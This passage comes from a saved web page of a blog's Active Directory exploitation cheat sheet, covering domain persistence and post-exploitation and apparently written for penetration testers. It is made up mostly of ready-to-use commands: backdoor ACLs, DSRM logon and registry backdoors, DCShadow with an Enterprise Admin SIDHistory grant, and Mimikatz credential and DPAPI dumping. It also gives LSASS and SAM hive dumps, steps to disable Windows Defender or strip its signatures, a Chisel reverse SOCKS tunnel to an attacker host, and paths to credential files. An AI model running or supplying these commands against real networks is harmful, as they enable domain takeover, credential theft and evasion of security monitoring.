olbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;=
-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"><c=
ode class=3D" language-powershell" data-lang=3D"powershell"><span class=3D"=
token function">Add-ObjectACL</span> <span class=3D"token operator">-</span=
>TargetDistinguishedName <span class=3D"token string">"dc=3Dtargetdomain,dc=
=3Dcom"</span> <span class=3D"token operator">-</span>PrincipalSamAccountNa=
me BackdoorUser <span class=3D"token operator">-</span>Rights DCSync
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"domain-controller-dsrm-admin"=
>Domain Controller DSRM admin</h3><p>The DSRM admin is the local administra=
tor account of the DC. Remote logon needs to be enabled first.</p><div clas=
s=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"co=
lor:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size=
:4" class=3D" language-powershell"><code class=3D" language-powershell" dat=
a-lang=3D"powershell"><span class=3D"token function">New-ItemProperty</span=
> <span class=3D"token string">"HKLM:\System\CurrentControlSet\Control\Lsa\=
"</span> <span class=3D"token operator">-</span>Name <span class=3D"token s=
tring">"DsrmAdminLogonBehavior"</span> <span class=3D"token operator">-</sp=
an>Value 2 <span class=3D"token operator">-</span>PropertyType DWORD
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Now we can login remotely using the =
local admin hash dumped on the DC before (with <code>lsadump::sam</code>, s=
ee <a href=3D"https://casvancooten.com/posts/2020/11/windows-active-directo=
ry-exploitation-cheat-sheet-and-command-reference/#dumping-secrets-with-mim=
ikatz">=E2=80=98Dumping secrets with Mimikatz=E2=80=99</a> below). Use e.g.=
 =E2=80=98overpass-the-hash=E2=80=99 to get a session (see <a href=3D"https=
://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-che=
at-sheet-and-command-reference/#mimikatz">=E2=80=98Mimikatz=E2=80=99</a> ab=
ove).</p><h3 id=3D"modifying-security-descriptors-for-remote-wmi-access">Mo=
difying security descriptors for remote WMI access</h3><p>Give user WMI acc=
ess to a machine, using <a href=3D"https://github.com/samratashok/nishang/b=
lob/master/Backdoors/Set-RemoteWMI.ps1">Set-RemoteWMI</a> cmdlet from Nisha=
ng. Can be run to persist access to e.g. DCs.</p><div class=3D"highlight"><=
div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;backg=
round-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" lan=
guage-powershell"><code class=3D" language-powershell" data-lang=3D"powersh=
ell"><span class=3D"token function">Set-RemoteWMI</span> <span class=3D"tok=
en operator">-</span>UserName BackdoorUser <span class=3D"token operator">-=
</span>ComputerName dc<span class=3D"token punctuation">.</span>targetdomai=
n<span class=3D"token punctuation">.</span>com <span class=3D"token operato=
r">-</span>namespace <span class=3D"token string">'root\cimv2'</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>For execution, see <a href=3D"https:=
//casvancooten.com/posts/2020/11/windows-active-directory-exploitation-chea=
t-sheet-and-command-reference/#command-execution-with-wmi">=E2=80=98Command=
 execution with WMI=E2=80=99</a> above.</p><h3 id=3D"modifying-security-des=
criptors-for-powershell-remoting-access">Modifying security descriptors for=
 PowerShell Remoting access</h3><p>Give user PowerShell Remoting access to =
a machine, using <a href=3D"https://github.com/samratashok/nishang/blob/mas=
ter/Backdoors/Set-RemotePSRemoting.ps1">Set-RemotePSRemoting.ps1</a> cmdlet=
 from Nishang. Can be run to persist access to e.g. DCs.</p><div class=3D"h=
ighlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d=
0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" cl=
ass=3D" language-powershell"><code class=3D" language-powershell" data-lang=
=3D"powershell"><span class=3D"token function">Set-RemotePSRemoting</span> =
<span class=3D"token operator">-</span>UserName BackdoorUser <span class=3D=
"token operator">-</span>ComputerName dc<span class=3D"token punctuation">.=
</span>targetdomain<span class=3D"token punctuation">.</span>com
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>For execution, see <a href=3D"https:=
//casvancooten.com/posts/2020/11/windows-active-directory-exploitation-chea=
t-sheet-and-command-reference/#command-executin-with-powershell-remoting">=
=E2=80=98Command execution with PowerShell Remoting=E2=80=99</a> above.</p>=
<h3 id=3D"modifying-dc-registry-security-descriptors-for-remote-hash-retrie=
val-using-damp">Modifying DC registry security descriptors for remote hash =
retrieval using DAMP</h3><p>Using <a href=3D"https://github.com/HarmJ0y/DAM=
P">DAMP toolkit</a>, we can backdoor the DC registry to give us access on t=
he <code>SAM</code>, <code>SYSTEM</code>, and <code>SECURITY</code> registr=
y hives. This allows us to remotely dump DC secrets (hashes).</p><p>We add =
the backdoor using the <code>Add-RemoteRegBackdoor.ps1</code> cmdlet from D=
AMP.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=
=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-t=
ab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D" langua=
ge-powershell" data-lang=3D"powershell"><span class=3D"token function">Add-=
RemoteRegBackdoor</span> <span class=3D"token operator">-</span>ComputerNam=
e dc<span class=3D"token punctuation">.</span>targetdomain<span class=3D"to=
ken punctuation">.</span>com <span class=3D"token operator">-</span>Trustee=
 BackdoorUser
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Dump secrets remotely using the <cod=
e>RemoteHashRetrieval.ps1</code> cmdlet from DAMP (run as =E2=80=98Backdoor=
User=E2=80=99 user).</p><div class=3D"highlight"><div class=3D"code-toolbar=
"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-=
tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"><code c=
lass=3D" language-powershell" data-lang=3D"powershell"><span class=3D"token=
 comment"># Get machine account hash for silver ticket attack</span>
<span class=3D"token function">Get-RemoteMachineAccountHash</span> <span cl=
ass=3D"token operator">-</span>ComputerName DC01

<span class=3D"token comment"># Get local account hashes</span>
<span class=3D"token function">Get-RemoteLocalAccountHash</span> <span clas=
s=3D"token operator">-</span>ComputerName DC01

<span class=3D"token comment"># Get cached credentials (if any)</span>
<span class=3D"token function">Get-RemoteCachedCredential</span> <span clas=
s=3D"token operator">-</span>ComputerName DC01
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"dcshadow">DCShadow</h3><p>DCS=
hadow is an attack that masks certain actions by temporarily imitating a Do=
main Controller. If you have Domain Admin or Enterprise Admin privileges in=
 a root domain, it can be used for forest-level persistence.</p><p>Optional=
ly, as Domain Admin, give a chosen user the privileges required for the DCS=
hadow attack (uses <code>Set-DCShadowPermissions.ps1</code> cmdlet).</p><di=
v class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=
=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;ta=
b-size:4" class=3D" language-powershell"><code class=3D" language-powershel=
l" data-lang=3D"powershell"><span class=3D"token function">Set-DCShadowPerm=
issions</span> <span class=3D"token operator">-</span>FakeDC BackdoorMachin=
e <span class=3D"token operator">-</span>SamAccountName TargetUser <span cl=
ass=3D"token operator">-</span>Username BackdoorUser <span class=3D"token o=
perator">-</span>Verbose
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Then, from any machine, use Mimikatz=
 to stage the DCShadow attack.</p><div class=3D"highlight"><div class=3D"co=
de-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#20=
2020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-plaintext=
"><code class=3D" language-plaintext" data-lang=3D"plaintext"># Set SPN for=
 user
lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value=
:"SuperHacker/ServicePrincipalThingey"

# Set SID History for user (effectively granting them Enterprise Admin righ=
ts)
lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-=
280534878-1496970234-700767426-519

# Set Full Control permissions on AdminSDHolder container for user
## Requires retrieval of current ACL:
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=3DAdminSDHol=
der,CN=3DSystem,DC=3Dtargetdomain,DC=3Dcom")).psbase.ObjectSecurity.sddl

## Then get target user SID:
Get-NetUser -UserName BackdoorUser | select objectsid

## Finally, add full control primitive (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) =
for user
lsadump::dcshadow /object:CN=3DAdminSDHolder,CN=3DSystem,DC=3Dtargetdomain,=
DC=3Dcom /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;=
;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;[[S-1-5-21-1874506631-32=
19952063-538504511-45109]])
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><p>Finally, from either a DA session OR =
a session as the user provided with the DCShadow permissions before, run th=
e DCShadow attack. Actions staged previously will be performed without leav=
ing any logs =F0=9F=98=88</p><div class=3D"highlight"><div class=3D"code-to=
olbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;=
-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-plaintext"><co=
de class=3D" language-plaintext" data-lang=3D"plaintext">lsadump::dcshadow =
/push
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><h2 id=3D"post-exploitation">Post-Exploi=
tation</h2><h3 id=3D"lsass-protection">LSASS protection</h3><p>Sometimes, L=
SASS is configured to run as a protected process (PPL). You can query this =
with PowerShell as follows.</p><div class=3D"highlight"><div class=3D"code-=
toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#20202=
0;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell">=
<code class=3D" language-powershell" data-lang=3D"powershell"><span class=
=3D"token function">Get-ItemProperty</span> <span class=3D"token operator">=
-</span>Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa <span class=3D"toke=
n operator">-</span>Name <span class=3D"token string">"RunAsPPL"</span>=20
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>If this is the case, you can=E2=80=
=99t just dump or parse LSASS, and you need to disable the protection with =
something like <code>mimidrv.sys</code>. I won=E2=80=99t discuss how to do =
that here, but there are tools such as <a href=3D"https://github.com/itm4n/=
PPLdump">PPLDump</a> available to help.</p><h3 id=3D"dumping-os-credentials=
-with-mimikatz">Dumping OS credentials with Mimikatz</h3><div class=3D"high=
light"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0=
d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=
=3D" language-plaintext"><code class=3D" language-plaintext" data-lang=3D"p=
laintext"># Dump logon passwords
sekurlsa::logonpasswords

# Dump all domain hashes from a DC
## Note: Everything with /patch is noisy as heck since it writes to LSASS =
=F0=9F=9A=A9
lsadump::lsa /patch

# Dump only local users
lsadump::sam

# DCSync (requires 'ldap' SPN)
lsadump::dcsync /user:DOMAIN\krbtgt /domain:targetdomain.com

# Dump Windows secrets, such as stored creds for scheduled tasks (elevate f=
irst) =F0=9F=9A=A9
vault::list
vault::cred /patch

# Dump Kerberos encryption keys, including the AES256 key for better opsec =
(see 'Lateral Movement with Rubeus' section)=20
sekurlsa::ekeys
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><h3 id=3D"abusing-the-data-protection-ap=
i-dpapi-with-mimikatz">Abusing the Data Protection API (DPAPI) with Mimikat=
z</h3><p>Mimikatz has quite some functionality to access Windows=E2=80=99 D=
PAPI, which is used to encrypt many credentials, including e.g. browser pas=
swords.</p><p>Note that Mimikatz will automatically cache the master keys t=
hat it has seen (check cache with <code>dpapi::cache</code>), but this does=
 <em>NOT</em> work if no Mimikatz session is persisted (e.g. in Cobalt Stri=
ke or when using <code>Invoke-Mimikatz</code>). More information on using M=
imikatz for DPAPI is available <a href=3D"https://github.com/gentilkiwi/mim=
ikatz/wiki/howto-~-credential-manager-saved-credentials">here</a>.</p><div =
class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=
=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;ta=
b-size:4" class=3D" language-plaintext"><code class=3D" language-plaintext"=
 data-lang=3D"plaintext"># Find the IDs of protected secrets for a specific=
 user
dir C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials

# Get information, including the used master key ID, from a specific secret=
 (take the path from above)
dpapi::cred /in:C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials\1EF=
01CC92C17C670AC9E57B53C9134F3

# IF YOU ARE PRIVILEGED
# Dump all master keys from the current system
sekurlsa::dpapi

# IF YOU ARE NOT PRIVILEGED (session as target user required)
# Get the master key from the domain using RPC (the path contains the user =
SID, and then the ID of the masterkey identified in the previous step)
dpapi::masterkey /rpc /in:C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Pro=
tect\S-1-5-21-3865823697-1816233505-1834004910-1124\dd89dddf-946b-4a80-9fd3=
-7f03ebd41ff4

# Decrypt the secret using the retrieved master key
# Alternatively, leave out /masterkey and add /unprotect to decrypt the sec=
ret using the cached master key (see above for caveats)
dpapi::cred /in:C:\Users\[USERNAME]]\AppData\Local\Microsoft\Credentials\1E=
F01CC92C17C670AC9E57B53C9134F3 /masterkey:91721d8b1ec[...]e0f02c3e44deece5f=
318ad
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><h3 id=3D"dumping-secrets-without-mimika=
tz">Dumping secrets without Mimikatz</h3><p>We can also parse system secret=
s without using Mimikatz on the target system directly.</p><h4 id=3D"dumpin=
g-lsass">Dumping LSASS</h4><p>The preferred way to run Mimikatz is to do it=
 locally with a dumped copy of LSASS memory from the target. <a href=3D"htt=
ps://github.com/outflanknl/Dumpert">Dumpert</a>, <a href=3D"https://docs.mi=
crosoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>, or other (=
custom) tooling can be used to dump LSASS memory.</p><div class=3D"highligh=
t"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;b=
ackground-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D"=
 language-powershell"><code class=3D" language-powershell" data-lang=3D"pow=
ershell"><span class=3D"token comment"># Dump LSASS memory through a proces=
s snapshot (-r), avoiding interacting with it directly</span>
<span class=3D"token punctuation">.</span>\procdump<span class=3D"token pun=
ctuation">.</span>exe <span class=3D"token operator">-</span>r <span class=
=3D"token operator">-</span>ma lsass<span class=3D"token punctuation">.</sp=
an>exe lsass<span class=3D"token punctuation">.</span>dmp
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>After downloading the memory dump fi=
le on our attacking system, we can run Mimikatz and switch to =E2=80=98Mini=
dump=E2=80=99 mode to parse the file as follows. After this, we can run Mim=
ikatz=E2=80=99 credential retrieval commands as usual.</p><div class=3D"hig=
hlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d=
0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" clas=
s=3D" language-plaintext"><code class=3D" language-plaintext" data-lang=3D"=
plaintext">sekurlsa::minidump lsass.dmp
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><h4 id=3D"dumping-secrets-from-the-regis=
try">Dumping secrets from the registry</h4><p>We can dump secrets from the =
registry and parse the files =E2=80=9Coffline=E2=80=9D to get a list of sys=
tem secrets. =F0=9F=9A=A9</p><p>On the target, we run the following:</p><di=
v class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=
=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;ta=
b-size:4" class=3D" language-powershell"><code class=3D" language-powershel=
l" data-lang=3D"powershell">reg<span class=3D"token punctuation">.</span>ex=
e save hklm\sam c:\users\public\downloads\sam<span class=3D"token punctuati=
on">.</span>save
reg<span class=3D"token punctuation">.</span>exe save hklm\system c:\users\=
public\downloads\system<span class=3D"token punctuation">.</span>save
reg<span class=3D"token punctuation">.</span>exe save hklm\security c:\user=
s\public\downloads\security<span class=3D"token punctuation">.</span>save
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Then on our attacking box we can dum=
p the secrets with Impacket:</p><div class=3D"highlight"><div class=3D"code=
-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#2020=
20;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-bash"><code=
 class=3D" language-bash" data-lang=3D"bash">impacket-secretsdump -sam sam.=
save -system system.save -security security.save LOCAL <span class=3D"token=
 operator">&gt;</span> secrets.out
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Bash<=
/span></div></div></div></div><h4 id=3D"dumping-secrets-from-a-volume-shado=
w-copy">Dumping secrets from a Volume Shadow Copy</h4><p>We can also create=
 a =E2=80=9CVolume Shadow Copy=E2=80=9D of the <code>SAM</code> and <code>S=
YSTEM</code> files (which are always locked on the current system), so we c=
an still copy them over to our local system. An elevated prompt is required=
 for this.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tab=
index=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4=
;-o-tab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D" l=
anguage-powershell" data-lang=3D"powershell">wmic shadowcopy call create Vo=
lume=3D<span class=3D"token string">'C:\'</span>
<span class=3D"token function">copy</span> \\?\GLOBALROOT\Device\HarddiskVo=
lumeShadowCopy1\windows\system32\config\sam C:\users\public\sam<span class=
=3D"token punctuation">.</span>save
<span class=3D"token function">copy</span> \\?\GLOBALROOT\Device\HarddiskVo=
lumeShadowCopy1\windows\system32\config\system C:\users\public\system<span =
class=3D"token punctuation">.</span>save
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"windows-defender-evasion">Win=
dows Defender evasion</h3><p><em>Note: All below commands require administr=
ative privileges on the system!</em></p><p>You can query Defender exclusion=
s using PowerShell. If it returns any excluded paths, just execute your mal=
ware from there!</p><div class=3D"highlight"><div class=3D"code-toolbar"><p=
re tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-=
size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"><code class=
=3D" language-powershell" data-lang=3D"powershell"><span class=3D"token fun=
ction">Get-MpPreference</span> <span class=3D"token punctuation">|</span> <=
span class=3D"token function">select-object</span> <span class=3D"token ope=
rator">-</span>ExpandProperty ExclusionPath
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Alternatively, you could add an excl=
usion directory for your shady stuff. =F0=9F=91=80</p><div class=3D"highlig=
ht"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;=
background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D=
" language-powershell"><code class=3D" language-powershell" data-lang=3D"po=
wershell"><span class=3D"token function">Add-MpPreference</span> <span clas=
s=3D"token operator">-</span>ExclusionPath <span class=3D"token string">"C:=
\Users\Public\Downloads\SuperLegitDownloadDirectory"</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>If you=E2=80=99re more aggro, you ca=
n disable Defender entirely. It goes without saying that disabling AV/EDR p=
roducts is never a good idea in practice, best to work around it instead. =
=F0=9F=9A=A9</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre t=
abindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size=
:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D"=
 language-powershell" data-lang=3D"powershell"><span class=3D"token comment=
"># Disable realtime monitoring altogether</span>
<span class=3D"token function">Set-MpPreference</span> <span class=3D"token=
 operator">-</span>DisableRealtimeMonitoring <span class=3D"token boolean">=
$true</span>

<span class=3D"token comment"># Only disables scanning for downloaded files=
 or attachments</span>
<span class=3D"token function">Set-MpPreference</span> <span class=3D"token=
 operator">-</span>DisableIOAVProtection <span class=3D"token boolean">$tru=
e</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>As an alternative to disabling Defen=
der, you can leave it enabled and just remove all virus signatures from it.=
</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0=
" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-si=
ze:4;tab-size:4" class=3D" language-powershell"><code class=3D" language-po=
wershell" data-lang=3D"powershell"><span class=3D"token string">"C:\Program=
 Files\Windows Defender\MpCmdRun.exe"</span> <span class=3D"token operator"=
>-</span>RemoveDefinitions <span class=3D"token operator">-</span>All
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"chisel-proxying">Chisel proxy=
ing</h3><p>If you need to proxy traffic over a compromised Windows machine,=
 <a href=3D"https://github.com/jpillora/chisel">Chisel</a> (or <a href=3D"h=
ttps://github.com/shantanu561993/SharpChisel">SharpChisel</a>) is a good ch=
oice. Chisel allows port forwarding, but my favorite technique is setting u=
p a reverse SOCKS proxy on the target machine, allowing you to tunnel any t=
raffic over the target system.</p><p>On our attacking machine (Linux in thi=
s case), we start a Chisel server on port 80 in reverse SOCKS5 mode.</p><di=
v class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=
=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;ta=
b-size:4" class=3D" language-bash"><code class=3D" language-bash" data-lang=
=3D"bash"><span class=3D"token function">sudo</span> ./chisel server -p <sp=
an class=3D"token number">80</span> --reverse --socks5
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Bash<=
/span></div></div></div></div><p>Then, on our compromised target system, we=
 connect to this server and tell it to proxy all traffic over it via the re=
verse SOCKS5 tunnel.</p><div class=3D"highlight"><div class=3D"code-toolbar=
"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-=
tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"><code c=
lass=3D" language-powershell" data-lang=3D"powershell"><span class=3D"token=
 punctuation">.</span>\chisel<span class=3D"token punctuation">.</span>exe =
client 192<span class=3D"token punctuation">.</span>168<span class=3D"token=
 punctuation">.</span>49<span class=3D"token punctuation">.</span>67:80 R:s=
ocks
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>A proxy is now open on port 1080 of =
our linux machine. We can now use e.g. ProxyChains to tunnel over the targe=
t system.</p><h3 id=3D"juicy-files">Juicy files</h3><p>There are lots of fi=
les that may contain interesting information. Tools like <a href=3D"https:/=
/github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/mas=
ter/winPEAS">WinPEAS</a> or collections like <a href=3D"https://github.com/=
PowerShellMafia/PowerSploit">PowerSploit</a> may help in identifying juicy =
files (for privesc or post-exploitation).</p><p>Below is a list of some fil=
es I have encountered to be of relevance. Check files based on the programs=
 and/or services that are installed on the machine.</p><blockquote><p>In ad=
dition, don=E2=80=99t forget to enumerate any local databases with <code>sq=
lcmd</code> or <code>Invoke-SqlCmd</code>!</p></blockquote><pre tabindex=3D=
"0"><code># All user folders
## Limit this command if there are too many files ;)
tree /f /a C:\Users

# Web.config
C:\inetpub\www\*\web.config

# Unattend files
C:\Windows\Panther\Unattend.xml

# RDP config files
C:\ProgramData\Configs\

# Powershell scripts/config files
C:\Program Files\Windows PowerShell\

# PuTTy config
C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty

# FileZilla creds
C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml

# Jenkins creds (also check out the Windows vault, see above)
C:\Program Files\Jenkins\credentials.xml

# WLAN profiles
C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml

# TightVNC password (convert to Hex, then decrypt with e.g.: https://github=
.com/frizb/PasswordDecrypts)
Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | se=
lect -ExpandProperty Password
</code></pre></div></article><hr><div class=3D"post-info"><p><svg xmlns=3D"=
http://www.w3.org/2000/svg" width=3D"24" height=3D"24" viewBox=3D"0 0 24 24=
" fill=3D"none" stroke=3D"currentcolor" stroke-width=3D"2" stroke-linecap=
=3D"round" stroke-linejoin=3D"round" class=3D"feather feather-tag meta-icon=
"><path d=3D"M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 =
2 0 010 2.82z"></path><line x1=3D"7" y1=3D"7" x2=3D"7" y2=3D"7"></line></sv=
g><span class=3D"tag"><a href=3D"https://casvancooten.com/tags/active-direc=
tory/">Active Directory</a></span>
<span class=3D"tag"><a href=3D"https://casvancooten.com/tags/windows/">Wind=
ows</a></span>
<span class=3D"tag"><a href=3D"https://casvancooten.com/tags/hacking/">Hack=
ing</a></span></p><p><svg xmlns=3D"http://www.w3.org/2000/svg" width=3D"24"=
 height=3D"24" viewBox=3D"0 0 24 24" fill=3D"none" stroke=3D"currentcolor" =
stroke-width=3D"2" stroke-linecap=3D"round" stroke-linejoin=3D"round" class=
=3D"feather feather-file-text"><path d=3D"M14 2H6A2 2 0 004 4v16a2 2 0 002 =
2h12a2 2 0 002-2V8z"></path><polyline points=3D"14 2 14 8 20 8"></polyline>=
<line x1=3D"16" y1=3D"13" x2=3D"8" y2=3D"13"></line><line x1=3D"16" y1=3D"1=
7" x2=3D"8" y2=3D"17"></line><polyline points=3D"10 9 9 9 8 9"></polyline><=
/svg>6475 Words</p><p><svg xmlns=3D"http://www.w3.org/2000/svg" width=3D"24=
" height=3D"24" viewBox=3D"0 0 24 24" fill=3D"none" stroke=3D"currentcolor"=
 stroke-width=3D"2" stroke-linecap=3D"round" stroke-linejoin=3D"round" clas=
s=3D"feather feather-calendar"><rect x=3D"3" y=3D"4" width=3D"18" height=3D=
"18" rx=3D"2" ry=3D"2"></rect><line x1=3D"16" y1=3D"2" x2=3D"16" y2=3D"6"><=
/line><line x1=3D"8" y1=3D"2" x2=3D"8" y2=3D"6"></line><line x1=3D"3" y1=3D=
"10" x2=3D"21" y2=3D"10"></line></svg>04-11-2020
(Last updated: 13-02-2023)</p><p><svg xmlns=3D"http://www.w3.org/2000/svg" =
width=3D"24" height=3D"24" viewBox=3D"0 0 24 24" fill=3D"none" stroke=3D"cu=
rrentcolor" stroke-width=3D"2" stroke-linecap=3D"round" stroke-linejoin=3D"=
round" class=3D"feather feather-git-commit"><circle cx=3D"12" cy=3D"12" r=
=3D"4"></circle><line x1=3D"1.05" y1=3D"12" x2=3D"7" y2=3D"12"></line><line=
 x1=3D"17.01" y1=3D"12" x2=3D"22.96" y2=3D"12"></line></svg><a href=3D"http=
s://github.com/chvancooten/chvancooten.github.io/commit/c8fc53a9f8a32d8044a=
9db1be96e367238f7173a" target=3D"_blank" rel=3D"noopener">c8fc53a</a>
@ 13-02-2023</p></div><div class=3D"pagination"><div class=3D"pagination__b=
uttons"><span class=3D"button previous"><a href=3D"https://casvancooten.com=
/posts/2021/03/getting-the-osep-certification-evasion-techniques-and-breach=
ing-defenses-pen-300-course-review/"><span class=3D"button__icon">=E2=86=90=
</span>
<span class=3D"button__text">Getting the OSEP Certification: 'Evasion Techn=
iques and Breaching Defenses' (PEN-300) Course Review</span></a></span>
<span class=3D"button next"><a href=3D"https://casvancooten.com/posts/2020/=
10/getting-the-crtp-certification-attacking-and-defending-active-directory-=
course-review/"><span class=3D"button__text">Getting the CRTP Certification=
: 'Attacking and Defending Active Directory' Course Review</span>
<span class=3D"button__icon">=E2=86=92</span></a></span></div></div></main>=
</div><footer class=3D"footer"><div class=3D"footer__inner"><div class=3D"f=
ooter__content"><span><a href=3D"https://creativecommons.org/licenses/by-nc=
/4.0/" target=3D"_blank" rel=3D"noopener">CC BY-NC 4.0</a></span>
<span><a href=3D"https://casvancooten.com/posts/index.xml" target=3D"_blank=
" title=3D"rss"><svg xmlns=3D"http://www.w3.org/2000/svg" width=3D"18" heig=
ht=3D"18" viewBox=3D"0 0 20 20" fill=3D"none" stroke=3D"currentcolor" strok=
e-width=3D"2" stroke-linecap=3D"round" stroke-linejoin=3D"round" class=3D"f=
eather feather-rss"><path d=3D"M4 11a9 9 0 019 9"></path><path d=3D"M4 4a16=
 16 0 0116 16"></path><circle cx=3D"5" cy=3D"19" r=3D"1"></circle></svg></a=
></span></div></div><div class=3D"footer__inner"><div class=3D"footer__cont=
ent"><span><a href=3D"http://gohugo.io/">Hugo</a> theme by <a href=3D"https=
://github.com/rhazdon">rhazdon</a></span></div></div></footer></div><iframe=
 style=3D"display: none;"></iframe><hv-copy-modal><template shadowmode=3D"o=
pen"><link href=3D"chrome-extension://bbpokcagpggnekcmamgdieebhpkjmljm/css/=
global.css" rel=3D"stylesheet" type=3D"text/css"><div><svg xmlns=3D"http://=
www.w3.org/2000/svg" width=3D"24" height=3D"24" viewBox=3D"0 0 24 24" fill=
